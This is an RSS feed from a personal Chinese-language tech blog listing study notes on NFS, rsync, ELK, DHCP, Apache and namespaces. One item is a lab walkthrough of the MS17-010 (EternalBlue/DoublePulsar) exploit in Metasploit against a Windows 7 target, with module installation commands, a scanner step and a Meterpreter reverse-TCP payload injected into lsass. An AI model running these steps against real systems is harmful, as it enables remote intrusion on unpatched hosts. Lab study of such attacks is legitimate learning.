<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>My Project on</title><link>https://cch0124.github.io/project/</link><description>Recent content in My Project on</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Mon, 07 Sep 2020 00:00:00 +0000</lastBuildDate><atom:link href="https://cch0124.github.io/project/index.xml" rel="self" type="application/rss+xml"/><item><title>學習紀錄</title><link>https://cch0124.github.io/project/2020-09-07-person-history/</link><pubDate>Mon, 07 Sep 2020 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/project/2020-09-07-person-history/</guid><description>自我學習紀錄 機器學習 資料屬性 統計資料 統計資料圖表觀察 資料的相異度與相似度 資料前處裡 資料清理應用 線性迴歸 數學 什麼是分類 什麼是集群 實作 Keras DDos Detection k-means DBSCAN Activation 介紹與實作 Tensorflow function 操作 keras 神經網路建立 全連接層觀察 梯度 損失函數 keras DNN實作- mnist 為例 keras CNN實作- cifar10 為例 自訂義 Layer Kubernetes Kubernetes 概觀 kubernetes 1.18 版本基本安裝 kubernetes POD 資源基本介紹 kubectl 基本操作 POD 相關資源介紹 資源定義與使用 namespace 和 POD 基本資源操作 POD 資源管理-part01 POD 資源管理-part02 POD 資源管理-part03 POD 資源需求及資源限制 POD 控制器 ReplicaSet 控制器 Deployment 控制器 DaemonSet 控制器 Job 和 CronJob 控制器 Service 和 Ingress Service 和 Ingress part02 Service 和 Ingress part03 Service Discovery and DNS 儲存與持久化儲存 part01 儲存與持久化儲存 part02 - NFS 儲存與持久化儲存 part03 - PV 與 PVC 儲存與持久化儲存 part04 - Storage Class ConfigMap 和 Secret StatefulSet 控制器 etcd 自我學習 GCP 和機器學習與 Kubernetes 應用 Machine Learning APIs Introduction to APIs in Google Extract, Analyze, and Translate Text from Images with the Cloud ML APIs Classify Text into Categories with the Natural Language API Detect Labels, Faces, and Landmarks in Images with the Cloud Vision API Entity and Sentiment Analysis with the Natural Language API Awwvision: Cloud Vision API from a Kubernetes Cluster Baseline Data, ML, AI AI Platform Dataprep Dataproc Video Intelligence Reinforcement Learning Kubernetes in Google Cloud Introduction to Docker Kubernetes Engine Orchestrating the Cloud with Kubernetes Managing Deployments Using Kubernetes Engine Continuous Delivery with Jenkins in Kubernetes Engine Kubernetes Solutions Using Kubernetes Engine to Deploy Apps with Regional Persistent Disks NGINX Ingress Controller on Google Kubernetes Engine Distributed Load Testing Using Kubernetes Running a MongoDB Database in Kubernetes with StatefulSets Coding Spring boot CRUD 員工管理系統 spring-boot 容器以及其它運用 使用 Dockerfile 製作容器 導入 jaeger 進行 API traceing JAVA JAVA JAVA - UVa JAVA - Network 放視大賞 - OTP 隨機密碼 Database Database Shell shell - hackerrank shell - LeetCode shell - codeware shell 自己練習寫小工具 Golang Golang 資料結構實作 運維與網路 ELK wireshark 軟體使用 分析應用-01 分析應用-02 分析應用-03 Namespace 模擬 Docker Ansible Jenkins firewall Vagrant loggin-efk monitor terraform tracing - jaeger 網路筆記 靜態路由 ARP DHCP PPP RIP 與子網路切割 HSRP telnet SSH NAT Static NAT Dynamic VLAN VLAN router-on-a-stick 實習 交換器 image 遺失 Apache 操作 DHCP 操作 ELK logstash 問題解決 ESXi 備份至 NAS rsyslog 研究 學校 作業 PortScanner - python JAVA 實作矩陣運算 Android 計算機 社團 Flutter flutter-BMI flutter-calculator Card Flutter 學習筆記 實驗室 NFS rsync UPS</description></item><item><title>NFS</title><link>https://cch0124.github.io/project/2020-04-27-nfs/</link><pubDate>Mon, 27 Apr 2020 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/project/2020-04-27-nfs/</guid><description>NFS 是經由 LAN 或 WAN 存取遠端檔案。它的共用是基於 Server 和 Client 關係。因此設定 NFS 時需要有網路位置和共享路徑。
Env 學校實驗室A系統 ubuntu 12.04 公網 學校實驗室B另一台主機 公網 Server Install sudo apt-get install nfs-kernel-server share dir setting // 學校實驗A室備份都放置 /home1/....../backup/NFS // share_dir client_ip(env setting) $ sudo vi /etc/exports share_dir 實驗室B_IP(rw,sync,no_root_squash,insecure,no_subtree_check) $ sudo chown nobody:nogroup share_dir $ sudo service nfs-kernel-server restart client_ip 就是實驗室B_IP，因為只限制該B實驗室存取，如果使用 * 則表示所有都可存取。
Option rw read and write operations sync write any change to the disc before applying it no_subtree_check: prevent subtree checking no_root_squash insecure Client Install sudo apt-get install nfs-common Mount directory of NFS $ sudo mount [nfs_server_ip]:[server_share_dir] [client_dir] 參考資料 mount 問題參考</description></item><item><title>input csv to elasticsearch</title><link>https://cch0124.github.io/project/2019-11-15-elk-input-csv/</link><pubDate>Fri, 15 Nov 2019 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/project/2019-11-15-elk-input-csv/</guid><description>想法 實驗透過 logstash 傳遞 CSV 檔至 Elasticsearch。這邊 CSV 檔是來自於這邊的數據集，因為很懶得用 python 來分析資料，且該數據集太肥大，所以想藉由 ELK 了力量 XD。
目錄架構
$ tree . ├── docker-compose.yml ├── elasticsearch │ ├── config │ │ ├── elasticsearch-node2.yml │ │ ├── elasticsearch-node3.yml │ │ └── elasticsearch.yml │ └── Dockerfile ├── kibana │ ├── config │ │ ├── kibana.crt │ │ ├── kibana.key │ │ └── kibana.yml │ └── Dockerfile ├── logstash │ ├── config │ │ ├── logstash.yml │ │ └── pipelines.</description></item><item><title>rsync 應用</title><link>https://cch0124.github.io/project/2019-07-28-rsync/</link><pubDate>Sun, 28 Jul 2019 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/project/2019-07-28-rsync/</guid><description>Description 我是用 NAS 存放備份檔。方式有 2 種
rsync 來建立鏡像資料夾。您需先用 CIFS 或 NFS 來將 Synology NAS 上的資料夾掛載至 Linux 伺服器。 Linux 執行指令，無需掛載資料夾。 其中第 2 種方式是我實做出來的方式。
rsync rsync 是一種異地備份軟體，與一般備份軟體不同的是，rsync 採用增量備份的方式，此類備份方式在每次備份前會先比較兩邊資料的差異，然後僅將差異的資料備份過去，而非備份全部的資料。
rsync 用於遠程複製和同步文件和目錄，以及在 Linux/Unix 系統中本地複製和同步。借助 rsync 命令，您可以跨目錄，跨硬碟和網路遠端和本地複製和同步數據，在兩台 Linux 計算機之間執行數據備份和鏡像。
rsync 的運作方式分為以下兩種：
伺服器（Server）模式
以常駐（Daemon）的方式運作，亦即以伺服器模式來服務（預設通訊埠為873），通常會在目的端運作，接收其他主機的備份資訊。 客戶端（Client）模式
以一般程式方式運作，可視為使用者端（Client）程式，通常用在來源端主機上，將資料備份到備份主機上運作。 rsync 優點和功能 它有效的將文件複製到遠端系統或從遠端系統同步文件。 支持複製 links、devices、owners、groups 和 permissions。 它比 scp（Secure Copy）更快，因為 rsync 使用遠端更新協議，它允許僅傳輸兩組文件之間的差異。第一次，它將文件或目錄的全部內容從源複製到目標，但是從下次起，它僅將更改的塊和字節複製到目標。 Rsync 消耗較少的 bandwidth，因為它使用壓縮和解壓縮方法，同時發送和接收數據兩端。 rsynv 參數 -v</description></item><item><title>Net Namespaces</title><link>https://cch0124.github.io/project/2019-07-03-namespace/</link><pubDate>Wed, 03 Jul 2019 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/project/2019-07-03-namespace/</guid><description>Namespaces tags: SDN Namespaces 是 Linux kernel 的一項功能，它對 kernel 資源進行區分隔離，使得一組行程看到一組資源，而另一組行程看到一組不同的資源。 好比一棟房子有多個房間，一個房間表示一組資源，妹妹住一間、哥哥住一間，彼此之間是相互看不到內部資源的，為每一個人提供隱私。
可分為下面幾列
pid Namespaces net Namespaces ipc Namespaces mnt Namespaces uts Namespaces user Namespaces Namespaces 不限制對 CPU、memory 和 disk 等物理上資源的存取。該存取由 cgroups 的 kernel 功能計算和限制。
Experiment Create network namespace cch@ubuntu:~$ sudo ip netns add red # create a new named network namespace cch@ubuntu:~$ sudo ip netns add blue cch@ubuntu:~$ sudo ip netns list # show all of the named network namespaces blue red 此圖是利用上面指令達成的構圖。建立 red 和 blue 的 namespace。</description></item><item><title>ups 應用</title><link>https://cch0124.github.io/project/2018-12-24-apc-ups/</link><pubDate>Mon, 24 Dec 2018 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/project/2018-12-24-apc-ups/</guid><description>APC UPS 環境 Back-UPS Pro 700 ubuntu 12 安裝套件 在 ubuntu 安裝 ups 套件，讓 ups 能控制系統
$ sudo apt-get -y install apcupsd ... Please check your configuration ISCONFIGURED in /etc/default/apcupsd 配置檔 /etc/apcupsd$ tree . ├── apccontrol ├── apcupsd.conf ├── changeme ├── commfailure ├── commok ├── hosts.conf ├── killpower ├── multimon.conf ├── offbattery ├── onbattery └── ups-monitor 0 directories, 11 files /etc/apcupsd$ sudo vi apcupsd.conf UPSCABLE usb # 定義將 UPS 連接到 computer 的電纜類型。 UPSTYPE usb DEVICE # 啟用自動檢測，不使用串行電纜交換信號 SCRIPTDIR /etc/apcupsd # apccontrol和事件腳本所在的目錄。 UPSNAME UPS_700 在 apcupsd 包電源故障的情況下，通知給商用電源的用戶，當商用電源未恢復時，損失如果電池耗盡，或指定的超時時間段已經過去，它已達到指定的電池充電速率任一，或已經達到剩餘電池壽命（通過基於內部UPS計算電力消耗速率來確定）。如果滿足任何這些關閉條件，請執行關閉。</description></item><item><title>logstash Multiple Pipelines</title><link>https://cch0124.github.io/project/2018-12-22-logstash-multiple-pipelines/</link><pubDate>Sat, 22 Dec 2018 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/project/2018-12-22-logstash-multiple-pipelines/</guid><description>logstash Multiple Pipelines 遇到的問題是，使用 filebeat 將 json 數據傳遞給 logstash 處裡並建立索引 pcap 與使用 logstash 讀取 CSV 數據建立 CSV 索引。 兩者都是不同的索引。但是 kibana 上的 pcap 索引卻讀取 csv 索引數據。這造成分析上的錯誤。以下會先了解 logstash 運作以及解決方式。
Logstash 事件處理管道有三個階段：inputs → filters → outputs。
inputs 生成事件 filters 修改它們，輸出將它們發送到其他地方 輸入和輸出支援編解碼，能夠在數據進入或退出管道時對數據進行編碼或解碼，而無需使用單獨的 filters。
inputs 將輸入的數據導入至 logstash。 常用的輸入：
file 從文件系統上的文件讀取，與UNIX命令非常相似 tail -0F syslog 在已知端口514上偵聽syslog消息並根據RFC3164格式進行解析 redis 使用 redis 通道和 redis 列表從 redis 服務器讀取。 Redis 通常用作集中式 Logstash 安裝中的&amp;quot;broker&amp;quot;，該安裝將 Logstash 事件從遠程 Logstash &amp;ldquo;shippers&amp;rdquo; 排隊。 beats 處理 Beats發送的事件 plugins</description></item><item><title>NAS 與 ESXi</title><link>https://cch0124.github.io/project/2018-07-14-nas-esxi/</link><pubDate>Wed, 18 Jul 2018 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/project/2018-07-14-nas-esxi/</guid><description>這邊因要將備份的虛擬機放至 NAS，NAS 必須使用掛載方式。
掛載、卸載 NAS 掛載 [root@localhost:/opt/ghettovcb/bin] esxcfg-nas -a -o 192.168.7.11 -s /volume1/ASUS-Server [NAME] Connecting to NAS volume: [NAME] Belstar_KH created and connected. # -a|--add Add a new NAS filesystem to /vmfs volumes. Requires --host and --share options. Use --readonly option only for readonly access. # -o|--host &amp;lt;host&amp;gt; Set the host name or ip address for a NAS mount. For version 4.1, can be a comma-separated list. # -s|--share &amp;lt;share&amp;gt; Set the name of the NAS share on the remote system.</description></item><item><title>rsyslog 應用</title><link>https://cch0124.github.io/project/2018-07-18-rsyslog/</link><pubDate>Wed, 18 Jul 2018 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/project/2018-07-18-rsyslog/</guid><description>rsyslog 服務為 Client/Server 服務，可同時實現兩種角色。
它可以作為服務器運行並收集網路中其他設備傳輸的所有日誌。
可以將所有記錄到遠程終端系統 syslog server 的 internal system events 發送到 Client 運行。 environment Ubuntu 14.04 Rsyslog Server Ubuntu 14.04 Client D-link Installation and configuration 預設上，只要安裝好 Ubuntu 都會有 rsyslog
verify dpkg --list 查看已安裝的套件 itachi@ubuntu:~$ dpkg --list | grep rsyslog ii rsyslog 7.4.4-1ubuntu2.6 amd64 reliable system and kernel logging daemon rsyslogd -v 查看版本 itachi@ubuntu:~$ rsyslogd -v rsyslogd 7.</description></item><item><title>DHCP 使用</title><link>https://cch0124.github.io/project/2018-07-06-dhcp/</link><pubDate>Fri, 06 Jul 2018 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/project/2018-07-06-dhcp/</guid><description>Description DHCP (Dynamic Host Configuration Protocol) Client 連上 DHCP Server 後，server 會提供 IP、gateway、DNS server 給 client Clients request 使用 UDP port 68 Server response 使用 UDP port 67 Environment DHCP Server - Ubuntu 14.04
Network - Host-Only 網段 192.168.8.0 DHCP Clients - Ubuntu 14.04（test1） and Ubuntu 14.04（test2）
Netwok - 網卡設定（VMware）成跟 Server 一樣 Installing DHCP in DHCP Server [itachi@ubuntu:~] sudo apt install isc-dhcp-server -y DHCP Server Setting DHCP 接口 [itachi@ubuntu:~] vi /etc/default/isc-dhcp-server INTERFACES=&amp;#34;eth0&amp;#34; # 接口上提供DHCP請求，可以多個。 網路設定 DHCP Server 設定 static Network</description></item><item><title>Apache 使用</title><link>https://cch0124.github.io/project/2018-07-05-apache/</link><pubDate>Thu, 05 Jul 2018 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/project/2018-07-05-apache/</guid><description>env ubuntu 14.04 apache2 PHP 7 Install Apache 套件 itachi@ubuntu:~$ sudo apt install apache2 -y Apache 版本 itachi@ubuntu:~$ apache2 -v Server version: Apache/2.4.7 (Ubuntu) Server built: Sep 18 2017 16:37:54 PHP7.0 套件 apache 為 php7.0 nginx 為 php7.0-fpm itachi@ubuntu:~$ sudo add-apt-repository ppa:ondrej/php #`Debian` 及其衍生產品（如 `Ubuntu`）維護的 `PPA` itachi@ubuntu:~$ sudo apt update itachi@ubuntu:~$ sudo apt install php7.0 -y PHP 版本 php -v itachi@ubuntu:~$ php -v PHP **7.</description></item><item><title>MS-17-010 實作</title><link>https://cch0124.github.io/project/2017-07-06-ms-17-010/</link><pubDate>Tue, 27 Jun 2017 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/project/2017-07-06-ms-17-010/</guid><description>1. 環境 Kali 64bit（攻擊機） windows7 SP1 64bit（靶機） 2. 利用的模組 github：https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit
3. 開始 利用的模組載入 Kali 如下：
git clone https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit.git #把 deps目錄 And eternalblue_doublepulsar.rb 作複製動做，預設是沒有此模組。 cp -r Eternalblue-Doublepulsar-Metasploit/deps/ \ /usr/share/metasploit-framework/modules/exploits/windows/smb/ \ cp -r Eternalblue-Doublepulsar-Metasploit/eternalblue_doublepulsar.rb \ /usr/share/metasploit-framework/modules/exploits/windows/smb/ cp -r Eternalblue-Doublepulsar-Metasploit/eternalblue_doublepulsar.rb \ /usr/share/metasploit-framework/modules/auxiliary/scanner/msf/ 4. 開啟 msfconsole 5. ms17-010 漏洞檢查 use auxiliary/scanner/smb/smb_ms17_010 #接著如下圖作 show options set RHOSTS IP # 設定靶機的IP 6. Exploit ms17-010 由於沒設定靶機 IP，以下進行設置
set RHOSTS IP # 設定靶機的IP #設定 PAYLOAD（因為是 64 bit，所以需要設定）如果是 windows/meterpreter/reverse_tcp，會獲取不到 Session。 set PAYLOAD windows/x64/meterpreter/reverse_tcp exploit #建立不起 Session show options #檢查 set PROCESSINJECT lsass.</description></item><item><title>scanner port</title><link>https://cch0124.github.io/project/2017-06-27-scanner-port-java/</link><pubDate>Tue, 27 Jun 2017 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/project/2017-06-27-scanner-port-java/</guid><description>import java.io.IOException; import java.net.ServerSocket; public class PortScanner{ public void scan(){ for(int i=1; i &amp;lt; 65535 ; i++ ){//port 是 0 - 65535 try{ ServerSocket ss = new ServerSocket(i);// ServerSocket(int port) 建構 }catch(IOException ex){// port 被占用則拋出例外 System.out.println(&amp;#34;Port: &amp;#34;+ i + &amp;#34; Occupied&amp;#34;); } } } public static void main(String[] args) { PortScanner pserver = new PortScanner(); pserver.scan(); } } // 在 TCP 協定中，埠號 0 是被保留的，不可使用。在 UDP 協定中，來源埠號是可以選擇要不要填上，如果設為 0，則代表沒有來源埠號。</description></item><item><title>ELK</title><link>https://cch0124.github.io/project/2018-07-11-elk/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/project/2018-07-11-elk/</guid><description>ELK ELK 是指 ElasticSearch 、 Logstash 和 Kibana 三個 open-source 的集合套件，這三個軟體可以組成一套日誌(log)分析架構。
如今資料量動輒 &amp;ldquo;T&amp;rdquo; 或幾個 &amp;ldquo;P&amp;rdquo; 等級的數據，正常的文字編輯器或數據處理軟體等工具往往都難以應對，但對原始的大數據進行分析，能提高對數據的洞察力。ELK 可以對大量Log 的數據處理，如索引、分析，當對這大量進行良好的控管，將可以依照這些數據得到一些有用的資訊。
Log 我是應用在 Log 的蒐集上因此小提一下 Log。
Log 就是系統或設備在連線和運作時所產生的記錄，藉由 Log 的蒐集和分析，讓 IT 人員能夠監控系統的運作狀態，判斷可能發生的事件，以及分析資料存取行為和使用者的活動。
網路是否遭到惡意的嘗試入侵？ 系統和網路運作是否有異常情況發生？ IT 人員只要對 Log 進行監控，就可以判斷可能的問題，或著狀況不清楚時，透過 Log 的查詢分析，可在較短時間內找出原因。
架構 核心架構介紹 Elasticsearch 全文檢索的搜索引擎 擴展性高 分散式系統的功能 索引方式管理維護數據 透過 API 取得相關數據的查詢、聚合等 Logstash 分析數據的入口點 支持很多的 Input、Output 數據套件 其中一種是將數據傳入至 Elasticsearch 蒐集原始數據 修改（過濾）數據，並將其數據轉換成有意義的資訊 完成數據格式化和重新組織數據 資料進入 logstash 流程 input file TCP UDP syslog beat 等等 filter grok mutate drop 等等 output Elasticsearch google_bigquery 等等 其中 Data Source 可以是 beat 或讀檔等方式傳入 Logstash，在 filter 部分可以處裡傳入的數據，最橫在把資訊傳至 Elasticsearch。</description></item></channel></rss>